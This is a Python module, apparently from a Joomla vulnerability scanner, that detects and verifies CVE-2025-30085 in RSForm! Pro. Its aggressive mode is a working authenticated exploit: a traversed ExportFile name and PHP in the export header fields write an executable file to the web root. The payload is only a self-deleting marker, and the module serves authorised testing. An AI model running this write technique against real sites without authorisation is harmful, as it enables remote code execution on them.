from __future__ import annotations

import re
import secrets
from typing import Any

from ...core.auth import JOOMLA_ADMIN_PATH, joomla_admin_login
from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2025-30085"
NAME = "RSForm! Pro authenticated submission-export remote code execution"
COMPONENT = "RSForm! Pro"
AFFECTED_RULE = "RSForm! Pro 3.0.0 through 3.3.14; fixed in 3.3.15"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
EXPORT_TASK_PATH = "/administrator/index.php?option=com_rsform&task=submissions.exporttask"
EXPORT_PROCESS_PATH = "/administrator/index.php?option=com_rsform&task=submissions.export.process"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    lower = parse_version_safe("3.0.0")
    fixed = parse_version_safe("3.3.15")
    if parsed is None or lower is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < lower:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("rsform", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="RSForm! Pro was not detected through its administrator manifest or component route.", action="No action is required unless RSForm! Pro is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected RSForm! Pro {version}, within the affected range below 3.3.15. The submission export accepts a raw ExportFile name."
        action = "Upgrade RSForm! Pro to 3.3.15 or newer and remove stray export files from the web root."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected RSForm! Pro {version}, which filters ExportFile to alphanumeric characters."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "RSForm! Pro was detected, but its version could not be determined."
        action = "Determine the installed RSForm! Pro version and upgrade to 3.3.15 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    form_id: int = 0,
    export_file: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Write a PHP marker through the authenticated CSV export.

    ``submissions.exporttask`` stores the posted ``ExportFile`` with the ``raw``
    filter in 3.1.11 and earlier, then ``submissions.export.process`` opens
    ``tmp_path/ExportFile`` for writing. A traversal name such as
    ``../proofcms-rsform-<hex>.php`` therefore writes the CSV header line to
    the web root. The header name is the PHP payload, and the export writes no
    rows when ``formId`` has no submissions. 3.3.15 filters ``ExportFile`` with
    ``alnum``, so the file lands in ``tmp/`` without an extension.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{JOOMLA_ADMIN_PATH}", detail="The export proof needs a Joomla administrator account. Pass --aggressive-arg username=... password=... on an authorized staging site. Nothing was sent.", action="Re-run with lab administrator credentials.")

    client = HttpClient(base_url=base, timeout=timeout, proxy=proxy)
    if not joomla_admin_login(client, base_url=base, username=username, password=password, timeout=timeout):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{JOOMLA_ADMIN_PATH}", detail="The administrator login did not establish a session; the export probe was not attempted.", action="Verify the lab credentials and administrator login route.")

    marker = f"PROOFCMS_RSFORM_RCE_{secrets.token_hex(4)}"
    filename = f"proofcms-rsform-{secrets.token_hex(4)}.php"
    export_name = export_file or f"../{filename}"
    payload = f'<?php echo "{marker}"; @unlink(__FILE__); ?>'
    data = {
        "formId": str(form_id),
        "ExportFile": export_name,
        "ExportType": "csv",
        "ExportHeaders": "1",
        "ExportRows": "0",
        "ExportDelimiter": "",
        "ExportFieldEnclosure": "",
        "ExportMultipleSeparator": "",
        f"ExportSubmission[{payload}]": "1",
        f"ExportOrder[{payload}]": "0",
    }
    staged = client.request(
        f"{base}{EXPORT_TASK_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(data),
        timeout=timeout,
    )
    if is_transport_error(staged):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{EXPORT_TASK_PATH}", detail=f"The export setup request failed in transit ({transport_error_detail(staged)}).", action="Retry when the target is reachable.")

    process_url = f"{base}{EXPORT_PROCESS_PATH}&exportStart=0&exportLimit=100&formId={form_id}"
    processed = client.request(process_url, method="POST", data=b"", timeout=timeout)
    if is_transport_error(processed):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=process_url, detail=f"The export process request failed in transit ({transport_error_detail(processed)}).", action="Retry when the target is reachable.")

    file_url = f"{base}/{filename}"
    served = client.get(file_url, timeout=timeout)
    if is_transport_error(served):
        file_status = 0
        file_body = ""
    else:
        file_status = served.get("status", 0)
        file_body = served.get("body") or ""
    stored = marker in file_body
    executed = stored and "<?php" not in file_body
    evidence = {
        "login_ok": True,
        "form_id": form_id,
        "export_file": export_name,
        "filename": filename,
        "marker": marker,
        "staged_status": staged.get("status"),
        "process_status": processed.get("status"),
        "process_body": (processed.get("body") or "")[:40],
        "file_url": file_url,
        "file_status": file_status,
        "marker_stored": stored,
        "marker_executed": executed,
    }
    if stored:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE" if executed else "VULNERABLE_UPLOAD_ONLY",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=file_url,
            evidence=evidence,
            detail=(
                "The authenticated submission export wrote the CSV header line to a traversed .php path under the "
                f"web root. The marker {'executed' if executed else 'was stored but the server did not execute the file'}."
            ),
            action="Upgrade RSForm! Pro to 3.3.15 or newer and delete the generated proofcms-rsform-*.php file.",
        )
    status = "BLOCKED_EXTERNAL" if processed.get("status") in (401, 403, 404, 500) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=file_url,
        evidence=evidence,
        detail=(
            f"The export completed with HTTP {processed.get('status')} but the traversed file was not readable at "
            f"the web root (HTTP {file_status}); 3.3.15+ filters ExportFile to alphanumeric characters."
        ),
        action="Upgrade affected RSForm! Pro versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{JOOMLA_ADMIN_PATH}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The administrator page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The administrator page is reachable; the export payload was not sent in safe mode.", action="Use aggressive mode with administrator credentials on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because RSForm! Pro was not detected as potentially affected."
            return passive
        form_value = aggressive_value(aggressive_args, aggressive_command, "form_id")
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            form_id=int(form_value) if form_value and form_value.isdigit() else 0,
            export_file=aggressive_value(aggressive_args, aggressive_command, "export_file"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (admin reachability) and aggressive (authenticated export write) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict | None = None,
    aggressive_command: str | None = None,
) -> dict:
    """Verify the uploaded artifact and report any manual removal step."""
    from ...core.cleanup import cleanup_http_artifact

    return cleanup_http_artifact(
        target_url,
        timeout=timeout,
        proxy=proxy,
        aggressive_args=aggressive_args,
        aggressive_command=aggressive_command,
    )


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Remote Code Execution", "module_version": "1.0.0", "last_reviewed": "2026-11-16", "updated": "2026-11-16", "required_detectors": ["rsform"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-30085", "https://www.rsjoomla.com", "https://mysites.guru/vulnerabilities/CVE-2025-30085"]}
